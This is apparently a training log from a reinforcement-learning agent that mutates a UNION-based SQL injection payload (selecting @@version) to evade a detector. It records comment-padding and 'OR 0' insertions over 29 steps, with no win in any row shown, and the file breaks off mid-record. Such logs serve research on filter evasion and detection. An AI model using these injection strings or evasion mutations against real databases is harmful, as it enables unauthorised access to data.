;episode;step;original_payload;state;action;next_state;reward;win
0;1;1;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";5;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";-0.5483871102333069;0
1;1;2;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";14;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""";-0.20497237741947175;0
2;1;3;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""";14;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""";-0.30497237741947175;0
3;1;4;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""";20;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""";-0.4049723774194718;0
4;1;5;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""";1;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""";-0.5049723774194718;0
5;1;6;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""";16;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-0.6043956056237221;0
6;1;7;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";3;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-0.7043956056237222;0
7;1;8;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";4;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-0.8043956056237221;0
8;1;9;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";4;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-0.9043956056237221;0
9;1;10;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";20;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-1.004395605623722;0
10;1;11;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";5;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-1.104395605623722;0
11;1;12;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";1;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-1.2043956056237222;0
12;1;13;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";6;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-1.3043956056237223;0
13;1;14;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";25;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-1.4043956056237221;0
14;1;15;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";6;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-1.5043956056237222;0
15;1;16;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";25;"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";-1.604395605623722;0
16;1;17;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#(Obk=(
union#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
NULL,#(Obk=(
NULL,#(Obk=(
#(Obk=(
(#(Obk=(
select#(Obk=(
@@version#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
)#(Obk=(
#(Obk=(
#(Obk=(
--""*";24;"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";-1.7835206001996995;0
17;1;18;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";18;"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";-1.8835206001996996;0
18;1;19;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";22;"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";-1.9835206001996994;0
19;1;20;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";4;"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";-2.0835206001996998;0
20;1;21;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";3;"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";-2.1835206001996994;0
21;1;22;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";6;"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";-2.2835206001996995;0
22;1;23;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""' OR 0#(Obk=(
union OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
NULL, OR 0#(Obk=(
NULL, OR 0#(Obk=(
 OR 0#(Obk=(
( OR 0#(Obk=(
select OR 0#(Obk=(
@@version OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
) OR 0#(Obk=(
 OR 0#(Obk=(
 OR 0#(Obk=(
--""*";14;"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";-2.2667903497815134;0
23;1;24;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";4;"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";-2.3667903497815135;0
24;1;25;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";6;"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";-2.4667903497815136;0
25;1;26;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";18;"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";-2.566790349781513;0
26;1;27;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";18;"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";-2.6667903497815133;0
27;1;28;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";20;"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";-2.7667903497815134;0
28;1;29;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
